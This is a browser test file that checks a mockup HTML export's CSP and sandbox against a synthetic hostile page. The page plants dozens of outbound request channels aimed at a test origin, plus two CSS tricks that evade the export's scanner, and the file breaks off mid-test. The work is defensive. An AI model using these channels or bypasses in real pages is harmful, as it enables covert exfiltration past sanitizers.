// The mockup export's real-browser rows (native Docs reader, completion plan C2 Tasks 9 and 10; base spec 2026-10-01 5.6.9
// "What is guaranteed", 4.17 "Save", and 5.8's row M5.B10). These are claims about what Chrome DOES with the saved file, so
// every row drives a real Chrome through `playwright-core`. Production artefacts, never copies of them: `parseMockup`,
// `extractMockupRefs`, `planMockupAssets`, `loadMockupAssets` (over a fake reader answering each asset's bytes),
// `buildMockupSnapshot` (through `buildExport`, as the sheet calls it), `exportInputOf` for the request, `buildMockupSrcdoc`
// for the planned document, and, for the app rows, the built PWA of the run's one production build with the real header,
// the real Export sheet and the real Save. Every fixture is synthetic.
//
// The corpus: ONE hostile mockup source, aimed at origin B (and a few channels at A's `/api/`), carrying every channel M5.B1's
// battery tries, as the markup a script-free document can hold: an `img` and its `srcset`, `script` and `script type=module`
// with `src`, `link` stylesheet, prefetch, preload and modulepreload, `@import`, a CSS background, `@font-face` and `content:
// url()`, `audio` and `video`, an SVG `image href`, an `iframe`; and the channels that need script (the `fetch` family, XHR,
// beacon, WebSocket, EventSource, `import()`) as the author's own inline battery script, which the strip removes. Beyond the
// 27 it plants the channels 5.8 names: `meta` refresh, `base`, a form action and a button `formaction` (both `post`, because a `get` submission replaces the action's query and would lose the `row` tag), an `a` with a `ping`, an
// `object` and an `embed`, an `input type=image`, a `video poster`, a `picture source`, a `table background`, an SVG `use`,
// an `on*` handler, an SVG script, a SMIL animation of `href`, and a stylesheet ASSET whose own rules name B. It also plants
// the two CSS forms the scanner misses, which 5.6.9 rests on the CSP: `image-set()` with a string and a CSS escape inside
// `url()`. Every request carries `?row=<id>` of its own build, so a build counts only its own requests; `/battery/<name>` is
// one of the 27 (the `reached` count) and `/extra/<name>` is a channel beyond them.
//
// The builds. Production is `buildExport` as shipped: the saved file, its wrapper with the CSP meta and its one frame
// `sandbox=""` over the inner document with its own CSP meta first. The other two builds are DERIVED from production's output
// in this file (nothing in the source tree is mutated):
//   strip only   the saved file parsed, the inner document's CSP meta removed, the wrapper's own CSP meta removed (a srcdoc
//                frame inherits its embedder's policy, so leaving it would keep a second CSP), and the wrapper frame's
//                `sandbox` attribute removed: the stripped clone with NO CSP and NO sandbox;
//   CSP only     the UNstripped clone of the planned document (`buildMockupSrcdoc`, the viewer's own inliner, scripts, links,
//                forms and all), with the viewer's CSP meta replaced by the export CSP meta, first in the document, and the
//                viewer's click guard removed, in a bare host page's `sandbox=""` frame (no wrapper meta).
// The control for both is the same unstripped planned document with NO CSP and NO sandbox (`ctl`), and for the CSP-only build also
// the same document with the empty sandbox and no CSP (`sandbox-only`), which shows the sandbox is not what closes the static
// channels, so the CSP is.
//
// Rows (each with its control, the same fixture in the same Chrome with the wall taken away):
//   M5.B10 / all layers   the saved file, opened top-level from `file://` and from origin A (a static route sending only a
//                         content type, with the harness's cookie set for A): 0/27 and nothing of the extras reaches B, and
//                         nothing reaches A's `/api/`, with no click, with the former link clicked, and with the form tapped;
//                         the saved file's frame renders (the inlined stylesheet applies) so a negative is not an empty page
//   M5.B10 / strip only   no channel through script, element URL attributes (SVG `href` included), `link`, `meta` refresh,
//                         forms or `ping` reaches B; only the two named CSS forms (`image-set()`, a CSS escape inside `url`)
//                         may reach B, and both do (measured), so they rest on the CSP; every other channel reaching B is red
//   M5.B10 / CSP only     no fetch-type channel reaches B (`ping` included); the self-navigations (the `meta` refresh and a
//                         click on the link, which this build never stripped) are excluded by name (lab 3), and a click on
//                         the unstripped link is measured to navigate the frame to B (the named exclusion, recorded)
//   second load           in the production and strip-only builds a click on a former link fires no second document commit of
//                         the inner frame (Playwright's `framenavigated`, with B's server as the second witness); CONTROL:
//                         the unstripped page with no CSP, the same click, commits a second document and reaches B
//   controls              (1) the unstripped planned document with no CSP and no sandbox reaches B on at least 20 of the 27
//                         and on the channels beyond them it can; (2) the empty sandbox alone does not close the static
//                         channels; (3) `meta` refresh, the form and the link each reach B in the unstripped page; (4) with
//                         step 3's URL allowlist dropped (one planted SVG `image href` put back on the strip-only build in the
//                         test, after the strip), the strip-only build reaches B through that SVG `image href`
//   the real Save         the real built PWA: open an `.html` leaf on a draft page whose mockup inlines one draft asset, tap
//                         Export, tap Save: nothing downloads and the confirm sentence shows; tap the confirm's Save: one
//                         download fires, its name ends `-draft.html`, the page did not navigate to a `blob:` or `data:` URL,
//                         the blob was typed `application/octet-stream`, and the downloaded file, opened top-level from
//                         `file://`, renders its provenance and an inner frame and runs no script (a planted script's flag
//                         stays unset); CONTROL: with no draft asset the first Save tap downloads
//
// Windows: no row decides a negative by a fixed sleep. A negative first waits for a positive that bounds it (the saved file's
// `load`, then the inner document having rendered, or the build's two named CSS forms having arrived), then watches for the
// request that must not come for `max(1.5 s, 3 x the control's latency)`, the control run first in the same Chrome.
// Chrome's local-network checks are off, so they cannot make a property hold.
//
// Run: `( cd pwa && CCRC_CHROME=<a Chrome or Chromium binary> ./node_modules/.bin/vitest run --config vitest.browser.config.ts
// browser/docs-mockup-export.browser.test.ts )`, through `ccrc test`.
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import { chromium, type Browser, type BrowserContext, type Page } from 'playwright-core';
import { REFINED } from '@ccrc/ui';
import { DOCS_RESPONSE_HEADERS, type DocPin } from '../../shared/docs';
import { EXPORT_TEXT, fillSentence, pluralS } from '../src/docs/docsText';
import { buildExport } from '../src/docs/export/buildExport';
import { exportInputOf, type ExportRequest } from '../src/docs/export/exportInput';
import { exportWorktreeLabel } from '../src/docs/export/provenance';
import { DOCS_EXPORT_CSP } from '../src/docs/export/policy';
import { buildMockupSrcdoc, extractMockupRefs, loadMockupAssets } from '../src/docs/mockup/load';
import { parseMockup } from '../src/docs/mockup/parse';
import { planMockupAssets } from '../src/docs/mockup/plan';
import { MOCKUP_CLICK_GUARD, MOCKUP_CSP, metaFor } from '../src/docs/mockup/policy';
import type { MockupAssetReader, MockupContext } from '../src/docs/mockup/ports';
import { LAB_BATTERY_CHANNELS_JS, LAB_BATTERY_PRELUDE_JS } from '../src/readerLab/battery';
import { BLOB_1, COMMIT_A, FP_1, SERVED, draftOf, entry, fileResponse, holder, pageAt, treeOk, treeResponse } from '../test/docsFixtures';
import { LAB_BATTERY_CHANNELS } from '../../shared/readerLab';
import { openApp, serveDist, sharedDist, type DistServer } from './app';
import { onePixelPng, resolveChrome, startOrigins, type OriginHit, type OriginRoute, type Origins } from './harness';

const SECTION = 'specs';
const PROJECT = 'demo';
const COOKIE = { name: 'ccrc_demo', value: 'a' } as const;
const PNG = onePixelPng();
const NOW = Date.parse('2026-11-17T10:00:00Z');
const enc = (s: string): Uint8Array<ArrayBuffer> => new TextEncoder().encode(s);

/** The stylesheet asset the page inlines: it styles `#themed` (the positive that the inner document rendered) and its own rules
 *  name B, which the snapshot neutralises (the nested form of step 4). */
const themeCss = (b: string, row: string): string => `#themed{background-color:rgb(1, 2, 3)}\n.t{background:url(${b}/extra/asset-css?row=${row})}`;

// ---- the origins, the browser ----------------------------------------------------------------------------------------------

/** What origin A's `/export` route serves, by id: a saved file or a derived build, with a content type and nothing else. */
const PAGES = new Map<string, string>();
const routes: Readonly<Record<string, OriginRoute>> = {
  '/export': (hit) => ({
    headers: { 'content-type': 'text/html; charset=utf-8' },
    body: PAGES.get(new URL(hit.path, 'http://x.invalid').searchParams.get('id') ?? '') ?? '<!doctype html><title>none</title>',
  }),
};

let origins: Origins;
let dist: string;
let server: DistServer;
/** The first app row's latency, tap to download event, which the draft row's no-download window is taken from. */
let appLatency: number | undefined;
let browser: Browser;
let dir: string;
const contexts: BrowserContext[] = [];

beforeAll(async () => {
  const executablePath = resolveChrome(); // throws on a box with no Chrome: red, never skipped
  origins = await startOrigins(routes);
  dir = mkdtempSync(path.join(tmpdir(), 'ccrc-mockup-export-'));
  browser = await chromium.launch({ executablePath, headless: true, args: ['--disable-features=LocalNetworkAccessChecks'] });
}, 120_000);

afterAll(async () => {
  for (const c of contexts.splice(0)) await c.close().catch(() => undefined);
  await browser?.close();
  await server?.close();
  await origins?.close();
  if (dir !== undefined) rmSync(dir, { recursive: true, force: true });
});

afterEach(async () => {
  for (const c of contexts.splice(0)) await c.close().catch(() => undefined);
});

// ---- helpers ---------------------------------------------------------------------------------------------------------------

let seq = 0;
const newRow = (p: string): string => `${p}${seq += 1}`;
const sleep = (ms: number): Promise<void> => new Promise((r) => { setTimeout(r, ms); });

/** `read` polled every 50 ms until it answers something other than null/undefined/false, or `ms` pass (then it throws, naming
 *  `what`). A read that throws (a frame mid-navigation) counts as no answer yet. */
async function until<T>(what: string, read: () => Promise<T | null | undefined | false>, ms = 20_000): Promise<T> {
  const deadline = Date.now() + ms;
  for (;;) {
    let got: T | null | undefined | false = null;
    try { got = await read(); } catch { got = null; }
    if (got !== null && got !== undefined && got !== false) return got;
    if (Date.now() >= deadline) throw new Error(`timed out after ${ms} ms waiting for ${what}`);
    await sleep(50);
  }
}

/** The first hit of `hits` from `from` that `pred` accepts, polled every 50 ms for at most `ms`; null when none came. */
async function waitHit(hits: readonly OriginHit[], from: number, pred: (h: OriginHit) => boolean, ms: number): Promise<OriginHit | null> {
  const deadline = Date.now() + ms;
  for (;;) {
    const found = hits.slice(from).find(pred);
    if (found !== undefined) return found;
    if (Date.now() >= deadline) return null;
    await sleep(50);
  }
}

const rowOf = (h: OriginHit): string | null => new URL(h.path, 'http://x.invalid').searchParams.get('row');
const pathOf = (h: OriginHit): string => h.path.split('?')[0] ?? '';
const tagged = (hits: readonly OriginHit[], row: string): OriginHit[] => hits.filter((h) => rowOf(h) === row);
/** The battery channels a row reached on B, by name. */
function reached(hits: readonly OriginHit[], row: string): string[] {
  const names = new Set<string>();
  for (const h of tagged(hits, row)) {
    if (h.origin === 'b' && pathOf(h).startsWith('/battery/')) names.add(pathOf(h).slice('/battery/'.length));
  }
  return [...names].sort();
}
/** Every path of B this row reached, `/battery/*` and `/extra/*` alike. */
const bPaths = (hits: readonly OriginHit[], row: string): string[] =>
  [...new Set(tagged(hits, row).filter((h) => h.origin === 'b').map(pathOf))].sort();
/** A negative's window, taken from a positive: `max(1.5 s, 3 x how long the control took to show its effect)`. */
const windowFrom = (controlMs: number): number => Math.max(1500, 3 * controlMs);

const esc = (s: string): string => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;');

// ---- the corpus ------------------------------------------------------------------------------------------------------------

/** The two CSS forms the scanner misses (5.6.9: they rest on the CSP), by the path they request on B. */
const NAMED_CSS: readonly string[] = ['/extra/image-set', '/extra/css-escape'];
/** The self-navigations the CSP does not stop (lab 3), by the path they request on B: the `meta` refresh and the link click. */
const NAMED_NAVIGATION: readonly string[] = ['/extra/meta-refresh', '/extra/link-click'];
/** What Chrome asks of a page a navigation landed on (its icon): a consequence of the navigation, not a channel of the file. */
const LANDING: readonly string[] = ['/favicon.ico'];
/** The channels beyond the 27 that need no click and no script, by name: a control must reach each its build can. */
const FREE_EXTRAS = ['base', 'object', 'embed', 'input-image', 'video-poster', 'picture-source', 'table-background', 'svg-use'] as const;

/** The author's battery as an inline script (M5.B1's, the shipped channel text), every channel once to B. It is stripped by the
 *  export; in the control it runs. */
function batteryScript(b: string, row: string): string {
  return `<script>
(function () {
  window.addEventListener('load', async function () {
    const nap = (ms) => new Promise((r) => setTimeout(r, ms));
    ${LAB_BATTERY_PRELUDE_JS}
    const channels = ${LAB_BATTERY_CHANNELS_JS};
    for (const [name, run] of Object.entries(channels)) {
      try { run(${JSON.stringify(b)} + '/battery/' + name + '?row=' + ${JSON.stringify(row)}); } catch (e) { /* the channel threw */ }
    }
    await nap(2500);
  });
})();
</script>`;
}

/** The hostile mockup source. `refresh` plants the `meta` refresh, which leaves the page at once, so the builds whose page must
 *  stay (the controls of every other channel) are built without it. */
function source(b: string, a: string, row: string, refresh: boolean): string {
  const bat = (n: string): string => `${b}/battery/${n}?row=${row}`;
  const ex = (n: string): string => `${b}/extra/${n}?row=${row}`;
  const escaped = b.replace(/^h/, '\\68'); // `\68ttp://...`: a CSS escape inside url(), which the scanner does not match
  return `<!doctype html><html><head><meta charset="utf-8"><title>Synthetic hostile mockup</title>
${refresh ? `<meta http-equiv="refresh" content="0;url=${ex('meta-refresh')}">` : ''}
<base href="${b}/extra/base/">
<link rel="stylesheet" href="${bat('link-stylesheet')}"><link rel="prefetch" href="${bat('link-prefetch')}">
<link rel="preload" as="image" href="${bat('link-preload')}"><link rel="modulepreload" href="${bat('link-modulepreload')}">
<link rel="stylesheet" href="css/theme.css">
<script src="${bat('script')}"></script><script type="module" src="${bat('script-module')}"></script>
<style>@import url("${bat('style-import')}");
@font-face{font-family:bat;src:url("${bat('css-font-face')}")}.bat{font-family:bat}
.cu::before{content:url("${bat('css-content-url')}")}
.bg{width:10px;height:10px;background-image:url("${bat('css-background')}")}
.iset{width:10px;height:10px;background-image:image-set("${ex('image-set')}" 1x)}
.esc{width:10px;height:10px;background-image:url(${escaped}/extra/css-escape?row=${row})}</style></head>
<body><h1>Hostile mockup</h1><p id="themed">themed</p>
<img id="px" src="img/pixel.png" alt="">
<img src="${bat('image')}" alt=""><img srcset="${bat('image-srcset')} 1x" alt="">
<p class="bat">x</p><div class="cu">x</div><div class="bg"></div><div class="iset"></div><div class="esc"></div>
<audio src="${bat('audio')}" preload="auto"></audio><video src="${bat('video')}" preload="auto" poster="${ex('video-poster')}"></video>
<svg width="10" height="10"><image href="${bat('svg-image')}" width="10" height="10"/></svg>
<iframe src="${bat('iframe')}"></iframe>
<object data="${ex('object')}"></object><embed src="${ex('embed')}">
<input type="image" src="${ex('input-image')}" alt="x">
<picture><source srcset="${ex('picture-source')} 1x"><img src="img/pixel.png" alt=""></picture>
<table background="${ex('table-background')}"><tr><td>t</td></tr></table>
<svg width="10" height="10"><use href="${ex('svg-use')}#x"/></svg>
<svg width="10" height="10"><script>new Image().src='${ex('svg-script')}'</script></svg>
<svg width="10" height="10"><image width="10" height="10" href="img/pixel.png"><animate attributeName="href" values="${ex('smil')}" dur="1s" begin="0s" fill="freeze"/></image></svg>
<img src="rel/base-rel.png?row=${row}" alt="" onerror="new Image().src='${ex('onerror')}'">
<img src="${a}/api/x?row=${row}" alt="">
<form action="${ex('form')}" method="post"><button id="planted-submit" type="submit">go</button></form>
<form method="post"><button formaction="${ex('formaction')}">go2</button></form>
<a id="planted" href="${ex('link-click')}" ping="${ex('ping')}">planted</a>
${batteryScript(b, row)}</body></html>`;
}

// ---- the builds ------------------------------------------------------------------------------------------------------------

const CSP_META_RE = /<meta http-equiv="Content-Security-Policy"[^>]*>/;

interface Builds {
  /** The saved file, as `buildExport` makes it (all layers on). */
  readonly production: string;
  /** The production file with its inner CSP meta, its wrapper CSP meta and its frame's sandbox removed. */
  readonly strip: string;
  /** The strip-only build with ONE planted SVG `image href` put back after the strip (step 3's allowlist dropped). */
  readonly allowlist: string;
  /** The unstripped planned document under the export CSP in an empty-sandbox frame of a bare host page. */
  readonly csp: string;
  /** The same unstripped document with no CSP and no sandbox (the control). */
  readonly ctl: string;
  /** The same unstripped document with no CSP, in the empty-sandbox frame. */
  readonly sandboxOnly: string;
}

const hostPage = (frame: string): string => `<!doctype html><html><head><meta charset="utf-8"><title>host</title></head><body>${frame}</body></html>`;
const frameOf = (srcdoc: string, sandbox: string | null): string =>
  `<iframe${sandbox === null ? '' : ` sandbox="${esc(sandbox)}"`} srcdoc="${esc(srcdoc)}" style="width:600px;height:400px"></iframe>`;
const withDoctype = (doc: Document): string => `<!doctype html>${doc.documentElement.outerHTML}`;
const parseHtml = (html: string): Document => new DOMParser().parseFromString(html, 'text/html');

/** The page parsed, planned and loaded over a fake reader exactly as the viewer does, then exported through the builder the
 *  sheet calls, and the five derived builds. */
async function buildAll(b: string, a: string, row: string, refresh: boolean): Promise<Builds> {
  const html = source(b, a, row, refresh);
  const parsedExport = parseMockup(html);
  const parsedViewer = parseMockup(html);
  if (!parsedExport.ok || !parsedViewer.ok) throw new Error(`the corpus was refused by the pre-scan: ${JSON.stringify(parsedExport.prescan)}`);
  const files = new Map<string, Uint8Array<ArrayBuffer>>([['img/pixel.png', Uint8Array.from(PNG)], ['css/theme.css', enc(themeCss(b, row))]]);
  const entries = [entry(SECTION, 'm.html'), ...[...files].map(([p, bytes]) => entry(SECTION, p, { committed: { kind: 'file', blob: BLOB_1, size: bytes.byteLength } }))];
  const tree = treeOk({ entries, drafts: holder() });
  const pin: DocPin = { kind: 'committed', commit: COMMIT_A, servedRef: SERVED, section: SECTION, path: 'm.html' };
  const context: MockupContext = { project: PROJECT, pin, tree };
  const plan = planMockupAssets(extractMockupRefs(parsedExport.doc, `${SECTION}/m.html`).refs, context);
  const reader: MockupAssetReader = {
    read: async (p) => {
      const bytes = files.get(p.path);
      return bytes === undefined ? { kind: 'failed', failure: 'not-found' } : { kind: 'ok', bytes };
    },
  };
  const result = await loadMockupAssets(plan, reader, new AbortController().signal);
  const page = pageAt(`/docs/${PROJECT}/${SECTION}/m.html`);
  if (page.kind !== 'path') throw new Error('fixture: not a leaf page');
  const request: ExportRequest = {
    page, tree, assets: null, readAt: NOW,
    source: { kind: 'mockup', pin, show: fileResponse(html).show, doc: parsedExport.doc, assets: { plan, settled: Promise.resolve({ s: 'loaded', result }) } },
  };
  const input = exportInputOf(request, { exportedAt: NOW, theme: null });
  const exported = await buildExport(input);
  if (!exported.ok) throw new Error('the corpus did not fit');
  const production = new TextDecoder().decode(exported.bytes);

  // The inner document exactly as the saved file carries it, read out of the production wrapper.
  const wrapper = parseHtml(production);
  const frame = wrapper.querySelector('iframe');
  const inner = frame?.getAttribute('srcdoc') ?? '';
  if (frame?.getAttribute('sandbox') !== '' || !CSP_META_RE.test(inner)) throw new Error('the production file is not a sandbox="" frame over a CSP-first inner document');
  const innerNoCsp = inner.replace(CSP_META_RE, '');

  // Strip only: the saved file, no CSP anywhere, no sandbox.
  const stripDoc = parseHtml(production);
  stripDoc.querySelector('meta[http-equiv]')?.remove();
  stripDoc.querySelector('iframe')?.removeAttribute('sandbox');
  stripDoc.querySelector('iframe')?.setAttribute('srcdoc', innerNoCsp);
  const strip = withDoctype(stripDoc);

  // The allowlist control: ONE planted SVG image href put back, after the strip, on the strip-only build.
  const allowDoc = parseHtml(production);
  allowDoc.querySelector('meta[http-equiv]')?.remove();
  const allowFrame = allowDoc.querySelector('iframe');
  allowFrame?.removeAttribute('sandbox');
  const innerDoc = parseHtml(innerNoCsp);
  const planted = [...innerDoc.querySelectorAll('svg image')].find((el) => !el.hasAttribute('href') && el.getAttribute('width') === '10' && el.getAttribute('height') === '10' && !el.querySelector('animate'));
  if (planted === undefined) throw new Error('the stripped inner document holds no SVG image to put an href back on');
  planted.setAttribute('href', `${b}/battery/svg-image?row=${row}`);
  allowFrame?.setAttribute('srcdoc', withDoctype(innerDoc));
  const allowlist = withDoctype(allowDoc);

  // The unstripped planned document: the viewer's own inliner, scripts, links and forms intact.
  const built = buildMockupSrcdoc(parsedViewer.doc, result, [], true);
  if (!built.ok) throw new Error('the planned document is too large to build');
  const viewerMeta = metaFor(MOCKUP_CSP);
  if (!built.page.startsWith(viewerMeta)) throw new Error('the planned page does not begin with the viewer policy meta');
  const bare = built.page.replace(viewerMeta, '').replace(MOCKUP_CLICK_GUARD, '');
  if (bare.includes(MOCKUP_CLICK_GUARD) || bare.length === built.page.length) throw new Error('the click guard was not removed');
  const withExportCsp = metaFor(DOCS_EXPORT_CSP) + bare;
  return {
    production, strip, allowlist,
    csp: hostPage(frameOf(withExportCsp, '')),
    ctl: hostPage(frameOf(bare, null)),
    sandboxOnly: hostPage(frameOf(bare, '')),
  };
}

// ---- opening a build -------------------------------------------------------------------------------------------------------

type Where = 'file' | 'a';
const WHERES: readonly Where[] = ['file', 'a'];

interface Session {
  readonly tab: Page;
  readonly row: string;
  /** The index of the first hit this session can have caused. */
  readonly from: number;
  /** The documents the inner frame (any frame but the top one) committed, in order: its initial document counts as one. */
  readonly commits: string[];
  readonly t0: number;
}

/** Opens `html` top-level from `where` (a file under the run's temp directory, or origin A's static route with the harness's
 *  cookie set for A), and resolves when the saved file's own `load` has fired (its frame's load included). */
async function open(html: string, where: Where, row: string, name: string): Promise<Session> {
  const ctx = await browser.newContext();
  contexts.push(ctx);
  await ctx.addCookies([{ ...COOKIE, url: origins.a }]);
  const tab = await ctx.newPage();
  const commits: string[] = [];
  tab.on('framenavigated', (f) => { if (f !== tab.mainFrame()) commits.push(f.url()); });
  const id = `${row}-${name}`;
  let url: string;
  if (where === 'file') {
    writeFileSync(path.join(dir, `${id}.html`), html);
    url = pathToFileURL(path.join(dir, `${id}.html`)).href;
  } else {
    PAGES.set(id, html);
    url = `${origins.a}/export?id=${id}`;
  }
  const from = origins.hits.length;
  const t0 = Date.now();
  await tab.goto(url, { waitUntil: 'load' });
  return { tab, row, from, commits, t0 };
}

const inner = (s: Session) => s.tab.frameLocator('iframe');
/** The inner document has rendered: the inlined stylesheet applied to `#themed`. A positive that bounds every negative. */
const rendered = (s: Session): Promise<string> => until('the inner document to render', async () => {
  const c = await inner(s).locator('#themed').evaluate((el) => getComputedStyle(el).backgroundColor, undefined, { timeout: 3000 });
  return c === 'rgb(1, 2, 3)' ? c : null;
});
/** One click on `target` in the inner frame, `noWaitAfter` (a click may navigate). A missing element FAILS here, it never skips. */
const click = (s: Session, target: '#planted' | '#planted-submit'): Promise<void> => inner(s).locator(target).click({ timeout: 5000, noWaitAfter: true });

const hitsOf = (s: Session): OriginHit[] => origins.hits.slice(s.from);
/** A hit of this session's row that is not on B at an allowed path, or is on A or C at all. */
const stray = (s: Session, allowed: readonly string[]) => (h: OriginHit): boolean =>
  rowOf(h) === s.row && !(h.origin === 'b' && allowed.some((p) => pathOf(h) === p));

// ---- the controls, run first: they give the windows ------------------------------------------------------------------------

interface Control {
  /** Run to reach 20 of the 27 from the no-CSP, no-sandbox page, from `file://`: ms from navigation start. */
  readonly channelMs: number;
  readonly channelsFile: string[];
  /** Ms from the click on the unstripped link to its second document commit. */
  readonly clickMs: number;
}
let controlOnce: Promise<Control> | undefined;
/** Runs the controls the other rows take their windows from, once. The unstripped page, no CSP, no sandbox: the battery
 *  reaches B on at least 20 of the 27, and a click on its link commits a second document in the inner frame. */
function control(): Promise<Control> {
  controlOnce ??= (async (): Promise<Control> => {
    const row = newRow('ctl');
    const builds = await buildAll(origins.b, origins.a, row, false);
    const s = await open(builds.ctl, 'file', row, 'ctl');
    const channels = await until('the unstripped control to reach 20 of the 27', async () => {
      const r = reached(hitsOf(s), row);
      return r.length >= 20 ? r : null;
    }, 40_000);
    const channelMs = Date.now() - s.t0;
    // The link: a second page (one click a page), the same control.
    const crow = newRow('ctlc');
    const cb = await buildAll(origins.b, origins.a, crow, false);
    const c = await open(cb.ctl, 'file', crow, 'ctl-click');
    await rendered(c);
    const before = c.commits.length;
    const t1 = Date.now();
    await click(c, '#planted');
    await until('the control click to commit a second document', async () => (c.commits.length > before ? true : null));
    return { channelMs, channelsFile: channels, clickMs: Date.now() - t1 };
  })();
  return controlOnce;
}

// ---- the rows --------------------------------------------------------------------------------------------------------------

describe('M5.B10: the control, the unstripped snapshot with no CSP (the detector is not blind)', () => {
  it.each(WHERES)('opened from %s: reaches B on at least 20 of the 27 and on the free channels beyond them; the sandbox alone does not close the static channels', async (where) => {
    const ctl = await control();
    expect(ctl.channelsFile.length, `from file: ${ctl.channelsFile.join(', ')}`).toBeGreaterThanOrEqual(20);
    const row = newRow('ctlw');
    const builds = await buildAll(origins.b, origins.a, row, false);
    const s = await open(builds.ctl, where, row, 'ctl');
    const got = await until(`the control from ${where} to reach 20 of the 27`, async () => { const r = reached(hitsOf(s), row); return r.length >= 20 ? r : null; }, 40_000);
    const missing = LAB_BATTERY_CHANNELS.filter((c) => !got.includes(c));
    process.stderr.write(`M5B10-MEASURE ctl ${where}: reached ${got.length}/27 (missing: ${missing.join(', ') || 'none'}); extras ${bPaths(hitsOf(s), row).filter((p) => p.startsWith('/extra/')).join(' ')}\n`);
    expect(got.length).toBeGreaterThanOrEqual(20);
    // The beyond-27 channels a script-free, click-free page opens: the control reaches each it can (the measured ones).
    const extras = bPaths(hitsOf(s), row).filter((p) => p.startsWith('/extra/')).map((p) => p.slice('/extra/'.length));
    expect(FREE_EXTRAS.filter((e) => !extras.includes(e)).length, `the free extras the control missed: ${FREE_EXTRAS.filter((e) => !extras.includes(e)).join(', ')}`).toBeLessThanOrEqual(3);
    expect(extras.includes('onerror') || extras.includes('svg-script'), 'a script of the page ran in the control').toBe(true);

    // The empty sandbox alone (no CSP): the static channels still reach B, so a CSP-only build's closure is the CSP's.
    const srow = newRow('sbx');
    const sb = await buildAll(origins.b, origins.a, srow, false);
    const t = await open(sb.sandboxOnly, where, srow, 'sandbox-only');
    const stat = await until(`the sandbox-only control from ${where} to reach B`, async () => { const r = reached(hitsOf(t), srow); return r.length >= 8 ? r : null; }, 40_000);
    process.stderr.write(`M5B10-MEASURE sandbox-only ${where}: reached ${stat.length}/27: ${stat.join(', ')}\n`);
    expect(stat.length, `sandbox="" alone reaches B on the static channels: ${stat.join(', ')}`).toBeGreaterThanOrEqual(8);
    expect(stat.some((c) => c.startsWith('fetch') || c.startsWith('xhr') || c === 'beacon'), 'no script ran under sandbox=""').toBe(false);
  }, 240_000);

  it.each(WHERES)('opened from %s: `meta` refresh, the form and the link each reach B in the unstripped page', async (where) => {
    await control();
    const rrow = newRow('ctlr');
    const rb = await buildAll(origins.b, origins.a, rrow, true);
    const r = await open(rb.ctl, where, rrow, 'ctl-refresh').catch(() => null);
    expect(await waitHit(origins.hits, r?.from ?? origins.hits.length, (h) => rowOf(h) === rrow && pathOf(h) === '/extra/meta-refresh', 20_000), `${where}: the refresh reaches B`).not.toBeNull();
    for (const [target, wanted] of [['#planted-submit', '/extra/form'], ['#planted', '/extra/link-click']] as const) {
      const row = newRow('ctlk');
      const b = await buildAll(origins.b, origins.a, row, false);
      const s = await open(b.ctl, where, row, 'ctl-click');
      await rendered(s);
      await click(s, target);
      expect(await waitHit(origins.hits, s.from, (h) => rowOf(h) === row && h.origin === 'b' && pathOf(h) === wanted, 20_000), `${where}: ${target} reaches B on ${wanted}`).not.toBeNull();
    }
  }, 240_000);

  it.each(WHERES)('opened from %s: with step 3\'s URL allowlist dropped (one SVG image href put back after the strip) the strip-only build reaches B through it', async (where) => {
    await control();
    const row = newRow('allow');
    const b = await buildAll(origins.b, origins.a, row, false);
    const s = await open(b.allowlist, where, row, 'allowlist');
    const hit = await waitHit(origins.hits, s.from, (h) => rowOf(h) === row && h.origin === 'b' && pathOf(h) === '/battery/svg-image', 20_000);
    expect(hit, `${where}: the put-back SVG image href reaches B`).not.toBeNull();
    // ... and through that one channel only among the 27: the strip still holds for everything else.
    const names = reached(hitsOf(s), row);
    expect(names, `${where}: only the put-back channel of the 27`).toEqual(['svg-image']);
  }, 120_000);
});

describe('M5.B10 row 1: all layers on (the saved file as `buildExport` makes it)', () => {
  it.each(WHERES)('opened from %s: 0/27, no extra channel, nothing at A\'s /api/; the frame renders; a click on the former link fires no second document; the form tapped reaches nothing', async (where) => {
    const ctl = await control();
    const w = windowFrom(ctl.channelMs);
    for (const click_ of [null, '#planted', '#planted-submit'] as const) {
      const row = newRow('prod');
      const b = await buildAll(origins.b, origins.a, row, true);
      const s = await open(b.production, where, row, 'prod');
      await rendered(s);
      expect(await inner(s).locator('a#planted').count(), 'the planted link is still there as text, without an href').toBe(1);
      expect(await inner(s).locator('a#planted').getAttribute('href'), 'the former link has no href').toBeNull();
      const commitsBefore = s.commits.length;
      if (click_ !== null) await click(s, click_);
      const hit = await waitHit(origins.hits, s.from, stray(s, []), w);
      expect(hit, `${where}, ${click_ ?? 'no click'}: nothing reached any server (got ${JSON.stringify(hit)})`).toBeNull();
      expect(reached(hitsOf(s), row), `${where}: 0/27`).toEqual([]);
      expect(bPaths(hitsOf(s), row), `${where}: nothing of the extras either`).toEqual([]);
      expect(hitsOf(s).filter((h) => h.origin === 'a' && h.path.startsWith('/api/')), `${where}: nothing at A's /api/`).toEqual([]);
      if (click_ === '#planted') expect(s.commits.length, `${where}: a click on a former link fires no second document commit`).toBe(commitsBefore);
    }
  }, 240_000);

  it.each(WHERES)('opened from %s: the file is one sandbox="" frame over a CSP-first document, with the inlined files and the omitted ones listed', async (where) => {
    const row = newRow('shape');
    const b = await buildAll(origins.b, origins.a, row, true);
    const s = await open(b.production, where, row, 'shape');
    const attrs = await s.tab.evaluate(() => {
      const f = document.querySelectorAll('iframe');
      return { frames: f.length, sandbox: f[0]?.getAttribute('sandbox') ?? null, src: f[0]?.hasAttribute('src') ?? null, meta: document.querySelectorAll('meta[http-equiv]').length };
    });
    expect(attrs, 'one frame, sandbox present and empty, no src; the wrapper has its one CSP meta').toEqual({ frames: 1, sandbox: '', src: false, meta: 1 });
    const text = await s.tab.locator('body').innerText();
    expect(text, 'the inlined files are listed').toContain(EXPORT_TEXT.mockupInlined);
    expect(text, 'the stylesheet that names B is listed as inlined, committed').toContain('theme.css');
  }, 120_000);
});

describe('M5.B10 row 2: the strip only (no CSP, no sandbox)', () => {
  it.each(WHERES)('opened from %s: only image-set() and a CSS escape inside url() reach B, and both do; every other channel is red; no second document after a click on a former link', async (where) => {
    const ctl = await control();
    for (const click_ of [null, '#planted', '#planted-submit'] as const) {
      const row = newRow('strip');
      const b = await buildAll(origins.b, origins.a, row, true);
      const s = await open(b.strip, where, row, 'strip');
      await rendered(s);
      // The positive that bounds the negative: the two named forms arrive (they are what the CSP, and only the CSP, closes).
      const t = Date.now();
      for (const named of NAMED_CSS) {
